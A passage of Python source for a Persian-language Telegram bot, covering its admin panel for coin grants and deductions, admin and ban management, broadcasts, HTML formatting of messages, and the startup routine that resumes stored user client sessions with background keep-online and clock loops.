                + "کاربر: " + str(name) + chr(10)
                + "ایدی: `" + str(tid) + "`" + chr(10)
                + "دلیل بن قبلی: " + str(reason) + chr(10)
                + "پیام آنبن:\n" + msg_txt,
                parse_mode='Markdown',
                reply_markup=mk,
            )
            return
        if st['step'] == 'diamond_amount':
            try:
                amount = int(text)
                if amount <= 0: raise ValueError
                st['amount'] = amount
                st['step'] = 'diamond_text'
                bot.reply_to(message, "حالا متن سکه همگانی را بفرست:")
            except:
                bot.reply_to(message, "عدد معتبر وارد کن")
            return
        if st['step'] == 'diamond_text':
            amount = st['amount']
            del admin_states[uid]
            count = 0
            data = load_data()

            # اگر مالک سکه همگانی می‌ده، از موجودی خودش کم بشه
            if is_owner(uid):
                total_needed = 0
                for s, u in data['users'].items():
                    if not u.get('banned'):
                        total_needed += amount
                owner_coins = data['users'].get(str(OWNER_ID), {}).get('coins', 0)
                if owner_coins < total_needed:
                    bot.reply_to(message, f"سکه کافی نداری. نیاز: {total_needed} | موجودی: {owner_coins}")
                    main_panel(uid)
                    return
                data['users'][str(OWNER_ID)]['coins'] = owner_coins - total_needed

            for s, u in data['users'].items():
                if u.get('banned'): continue
                try:
                    u['coins'] = u.get('coins', 0) + amount
                    new_c = u['coins']
                    mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton(f"{new_c} سکه", callback_data="noop"))
                    try:
                        bot.copy_message(int(s), message.chat.id, message.message_id, reply_markup=mk)
                    except Exception:
                        html = message_to_html(message) or text
                        try:
                            bot.send_message(int(s), html, parse_mode='HTML', reply_markup=mk)
                        except Exception:
                            bot.send_message(int(s), text, reply_markup=mk)
                    count += 1
                except Exception:
                    pass
            save_data(data)
            bot.reply_to(message, f"سکه همگانی ({amount}) به {count} نفر ارسال شد")
            main_panel(uid)
            return

        if st['step'] == 'giveone_id':
            try:
                tid = int(text)
                if str(tid) not in load_data()['users']:
                    bot.reply_to(message, "کاربر پیدا نشد")
                    return
                st['tid'] = tid
                st['step'] = 'giveone_amount'
                bot.reply_to(message, "چقدر سکه بدم؟")
            except:
                bot.reply_to(message, "آیدی عددی وارد کن")
            return
        if st['step'] == 'giveone_amount':
            try:
                amount = int(text)
                if amount <= 0: raise ValueError
                st['amount'] = amount
                st['step'] = 'giveone_text'
                bot.reply_to(message, "متن دلخواه را بفرست (برای همان کاربر ارسال می‌شود):")
            except Exception:
                bot.reply_to(message, "عدد معتبر وارد کن")
            return
        if st['step'] == 'giveone_text':
            tid = st.get('tid')
            amount = int(st.get('amount') or 0)
            custom = text
            if is_owner(uid):
                owner_coins = get_ud(OWNER_ID, 'coins', 0)
                if owner_coins < amount:
                    bot.reply_to(message, "سکه کافی نداری. موجودی فعلی: " + str(owner_coins))
                    return
                set_user(OWNER_ID, 'coins', owner_coins - amount)
            cur = get_ud(tid, 'coins', 0)
            new = cur + amount
            set_user(tid, 'coins', new)
            try:
                mk = types.InlineKeyboardMarkup()
                mk.add(types.InlineKeyboardButton(str(new) + " سکه", callback_data="noop"))
                try:
                    bot.copy_message(tid, message.chat.id, message.message_id, reply_markup=mk)
                except Exception:
                    html = message_to_html(message) or custom
                    try:
                        bot.send_message(tid, html, parse_mode='HTML', reply_markup=mk)
                    except Exception:
                        bot.send_message(tid, custom, reply_markup=mk)
            except Exception:
                pass
            bot.reply_to(message, str(amount) + " سکه به " + str(tid) + " داده شد → " + str(new))
            del admin_states[uid]
            main_panel(uid)
            return

        # افزودن سکه با متن دلخواه (فقط مالک)
        if st['step'] == 'buycoin_id' and is_owner(uid):
            try:
                if text.strip() in ['خودم', 'خود', 'me']:
                    tid = OWNER_ID
                else:
                    tid = int(text)
                if str(tid) not in load_data()['users']:
                    bot.reply_to(message, "کاربر پیدا نشد")
                    return
                st['tid'] = tid
                st['step'] = 'buycoin_amount'
                bot.reply_to(message, "چقدر سکه اضافه کنم؟ فقط عدد:")
            except:
                bot.reply_to(message, "آیدی عددی وارد کن یا بنویس «خودم»")
            return
        if st['step'] == 'buycoin_amount' and is_owner(uid):
            try:
                amount = int(text)
                if amount <= 0: raise ValueError
                st['amount'] = amount
                st['step'] = 'buycoin_text'
                bot.reply_to(message, "حالا متن دلخواهت رو بفرست (این متن به کاربر ارسال می‌شه):")
            except:
                bot.reply_to(message, "عدد معتبر وارد کن")
            return
        if st['step'] == 'buycoin_text' and is_owner(uid):
            tid = st['tid']
            amount = st['amount']
            custom_text = text
            cur = get_ud(tid, 'coins', 0)
            new = cur + amount
            set_user(tid, 'coins', new)
            try:
                mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton(f"{new} سکه", callback_data="noop"))
                try:
                    bot.copy_message(tid, message.chat.id, message.message_id, reply_markup=mk)
                except Exception:
                    html = message_to_html(message) or custom_text
                    try:
                        bot.send_message(tid, html, parse_mode='HTML', reply_markup=mk)
                    except Exception:
                        bot.send_message(tid, custom_text, reply_markup=mk)
            except Exception:
                pass
            bot.reply_to(message, f"انجام شد ✅\n{amount} سکه به {tid} اضافه شد\nموجودی جدید: {new}")
            del admin_states[uid]
            main_panel(uid)
            return

        if st['step'] == 'remove_id':
            try:
                tid = int(text)
                if str(tid) not in load_data()['users']:
                    bot.reply_to(message, "کاربر پیدا نشد")
                    return
                st['tid'] = tid
                st['step'] = 'remove_amount'
                bot.reply_to(message, "چقدر سکه کم کنم؟")
            except:
                bot.reply_to(message, "آیدی عددی وارد کن")
            return
        if st['step'] == 'remove_amount':
            try:
                amount = int(text)
                if amount <= 0: raise ValueError
                st['amount'] = amount
                st['step'] = 'remove_one_text'
                bot.reply_to(message, "متن دلخواه را بفرست (برای همان کاربر ارسال می‌شود):")
            except Exception:
                bot.reply_to(message, "عدد معتبر وارد کن")
            return
        if st['step'] == 'remove_one_text':
            tid = st.get('tid')
            amount = int(st.get('amount') or 0)
            custom = text
            cur = get_ud(tid, 'coins', 0)
            new = max(0, cur - amount)
            set_user(tid, 'coins', new)
            try:
                mk = types.InlineKeyboardMarkup()
                mk.add(types.InlineKeyboardButton(str(new) + " سکه", callback_data="noop"))
                try:
                    bot.copy_message(tid, message.chat.id, message.message_id, reply_markup=mk)
                except Exception:
                    html = message_to_html(message) or custom
                    try:
                        bot.send_message(tid, html, parse_mode='HTML', reply_markup=mk)
                    except Exception:
                        bot.send_message(tid, custom, reply_markup=mk)
            except Exception:
                pass
            bot.reply_to(message, str(amount) + " سکه از " + str(tid) + " کم شد → " + str(new))
            del admin_states[uid]
            main_panel(uid)
            return
        if st['step'] == 'remove_all':
            try:
                amount = int(text)
                if amount <= 0: raise ValueError
                st['amount'] = amount
                st['step'] = 'remove_all_text'
                bot.reply_to(message, "متن دلخواه را بفرست (برای همه ارسال می‌شود):")
            except Exception:
                bot.reply_to(message, "عدد معتبر وارد کن")
            return
        if st['step'] == 'remove_all_text':
            amount = int(st.get('amount') or 0)
            custom = text
            count = 0
            data = load_data()
            for s, u in data['users'].items():
                if u.get('banned'):
                    continue
                cur = u.get('coins', 0)
                new_c = max(0, cur - amount)
                u['coins'] = new_c
                try:
                    mk = types.InlineKeyboardMarkup()
                    mk.add(types.InlineKeyboardButton(str(new_c) + " سکه", callback_data="noop"))
                    try:
                        bot.copy_message(int(s), message.chat.id, message.message_id, reply_markup=mk)
                    except Exception:
                        html = message_to_html(message) or custom
                        try:
                            bot.send_message(int(s), html, parse_mode='HTML', reply_markup=mk)
                        except Exception:
                            bot.send_message(int(s), custom, reply_markup=mk)
                    count += 1
                except Exception:
                    pass
            save_data(data)
            del admin_states[uid]
            bot.reply_to(message, str(amount) + " سکه از " + str(count) + " کاربر کم شد و پیام ارسال شد")
            main_panel(uid)
            return

        # Owner only: add/remove admin
        if st['step'] == 'add_admin' and is_owner(uid):
            try:
                aid = int(text)
                if aid == OWNER_ID:
                    bot.reply_to(message, "مالک نمی‌تواند به عنوان ادمین اضافه شود")
                    return
                if str(aid) not in load_data()['users']:
                    bot.reply_to(message, "کاربر در ربات ثبت‌نام نکرده")
                    return
                if add_admin(aid):
                    bot.reply_to(message, f"کاربر `{aid}` به لیست ادمین‌ها اضافه شد", parse_mode='Markdown')
                    try: bot.send_message(aid, "شما به عنوان ادمین ربات منصوب شدید.")
                    except: pass
                else:
                    bot.reply_to(message, "این کاربر قبلا ادمین است")
                del admin_states[uid]
                main_panel(uid)
            except:
                bot.reply_to(message, "آیدی عددی معتبر وارد کن")
            return

        if st['step'] == 'remove_admin' and is_owner(uid):
            try:
                aid = int(text)
                if remove_admin(aid):
                    bot.reply_to(message, f"کاربر `{aid}` از لیست ادمین‌ها حذف شد", parse_mode='Markdown')
                    try: bot.send_message(aid, "شما از مقام ادمینی عزل شدید.")
                    except: pass
                else:
                    bot.reply_to(message, "این کاربر ادمین نیست")
                del admin_states[uid]
                main_panel(uid)
            except:
                bot.reply_to(message, "آیدی عددی معتبر وارد کن")
            return


def message_to_html(message):
    """متن پیام ربات با حفظ فرمت (بولد/ایتالیک/کد/لینک/...) به HTML"""
    try:
        if getattr(message, 'html_text', None):
            return message.html_text
    except Exception:
        pass
    try:
        if getattr(message, 'html_caption', None):
            return message.html_caption
    except Exception:
        pass
    body = message.text or message.caption or ''
    entities = message.entities or message.caption_entities or None
    if not body:
        return ''
    if not entities:
        return body
    # ساخت HTML از entities
    try:
        chars = list(body)
        # utf-16 offsets
        def to_utf16_index(s, i):
            return len(s[:i].encode('utf-16-le')) // 2
        # better: work on utf-16 code units
        u16 = body.encode('utf-16-le')
        # map
        inserts = []  # (pos, tag, is_close)
        for e in entities:
            off = e.offset
            ln = e.length
            et = getattr(e, 'type', None) or ''
            if et in ('bold',):
                o, c = '<b>', '</b>'
            elif et in ('italic',):
                o, c = '<i>', '</i>'
            elif et in ('underline',):
                o, c = '<u>', '</u>'
            elif et in ('strikethrough',):
                o, c = '<s>', '</s>'
            elif et in ('code',):
                o, c = '<code>', '</code>'
            elif et in ('pre',):
                o, c = '<pre>', '</pre>'
            elif et in ('spoiler',):
                o, c = '<span class="tg-spoiler">', '</span>'
            elif et in ('blockquote',):
                o, c = '<blockquote>', '</blockquote>'
            elif et in ('text_link',) and getattr(e, 'url', None):
                o, c = f'<a href="{e.url}">', '</a>'
            else:
                continue
            inserts.append((off, o, False))
            inserts.append((off + ln, c, True))
        # closes first at same pos
        inserts.sort(key=lambda x: (x[0], 0 if x[2] else 1))
        # rebuild from utf-16
        def u16_slice(start, length):
            return u16[start*2:(start+length)*2].decode('utf-16-le')
        out = []
        prev = 0
        total = len(u16) // 2
        for pos, tag, _ in inserts:
            if pos > prev:
                out.append(u16_slice(prev, pos - prev))
            out.append(tag)
            prev = pos
        if prev < total:
            out.append(u16_slice(prev, total - prev))
        return ''.join(out)
    except Exception:
        return body


def copy_or_send(to_id, message, fallback_text=None):
    """کپی پیام با فرمت؛ در صورت خطا HTML/متن"""
    try:
        bot.copy_message(to_id, message.chat.id, message.message_id)
        return True
    except Exception:
        pass
    html = fallback_text
    if html is None:
        try:
            html = message_to_html(message)
        except Exception:
            html = message.text or message.caption or ''
    if not html and not (message.content_type != 'text'):
        return False
    try:
        if message.content_type == 'text' or message.content_type is None:
            bot.send_message(to_id, html, parse_mode='HTML')
            return True
    except Exception:
        try:
            bot.send_message(to_id, message.text or message.caption or str(fallback_text or ''))
            return True
        except Exception:
            return False
    # مدیا
    try:
        bot.copy_message(to_id, message.chat.id, message.message_id)
        return True
    except Exception:
        return False


def do_broadcast(message):
    if not is_admin(message.from_user.id): return
    uid = message.from_user.id
    # ذخیره موقت پیام همگانی و تایید ویرایش
    try:
        admin_states[uid] = {
            'step': 'broadcast_confirm',
            'chat_id': message.chat.id,
            'message_id': message.message_id,
        }
    except Exception:
        pass
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("خیر — ارسال", callback_data="bc_send"),
        types.InlineKeyboardButton("بله — ویرایش کردم", callback_data="bc_reedit"),
    )
    bot.reply_to(
        message,
        "نیاز به ویرایشی ندارید؟\nاگر دارید بنر را ویرایش کنید — خودکار ذخیره می‌شود.\nبعد روی دکمه بزنید:",
        reply_markup=mk,
    )

def do_ban(message):
    if not is_admin(message.from_user.id): return
    text = message.text.strip()
    tid = None
    if text.startswith('@'):
        try: tid = bot.get_chat(text).id
        except: pass
    else:
        try: tid = int(text)
        except: pass
    if not tid or str(tid) not in load_data()['users']:
        bot.reply_to(message, "کاربر پیدا نشد")
        return
    if tid == OWNER_ID:
        bot.reply_to(message, "نمی‌توان مالک را بن کرد")
        return
    banned = get_ud(tid, 'banned', False)
    if banned:
        set_user(tid, 'banned', False)
        set_user(tid, 'ban_notified', False)
        set_user(tid, 'self_enabled', True)
        bot.reply_to(message, f"{tid} آنبن شد")
        try: bot.send_message(tid, "آنبن شدید. میتوانید از ربات استفاده کنید.")
        except: pass
    else:
        set_user(tid, 'banned', True)
        set_user(tid, 'coins', 0)
        set_user(tid, 'self_enabled', False)
        asyncio.run_coroutine_threadsafe(stop_client(tid), loop)
        bot.reply_to(message, f"{tid} بن شد")
        try: bot.send_message(tid, "بن شدید")
        except: pass
    main_panel(message.from_user.id)

loop = asyncio.new_event_loop()

def run_loop():
    asyncio.set_event_loop(loop)
    loop.create_task(background_tasks())
    loop.create_task(interval_tasks())
    asyncio.get_event_loop().create_task(interval_tasks())
    loop.create_task(keep_online_loop())
    loop.create_task(typing_loop())
    loop.create_task(clock_loop())
    loop.run_forever()

if __name__ == '__main__':
    data = load_data()
    for s, u in data['users'].items():
        if u.get('session') and not u.get('banned'):
            asyncio.run_coroutine_threadsafe(start_client(int(s)), loop)
        # اکانت های اضافه
        for aid, inf in (u.get('extra_accounts') or {}).items():
            sess = inf.get('session')
            if sess:
                try:
                    asyncio.run_coroutine_threadsafe(start_extra_client(int(s), aid, sess), loop)
                except Exception:
                    pass
    t = threading.Thread(target=run_loop, daemon=True)
    t.start()
    print("ربات آماده است...")
    bot.infinity_polling(skip_pending=True, timeout=60)
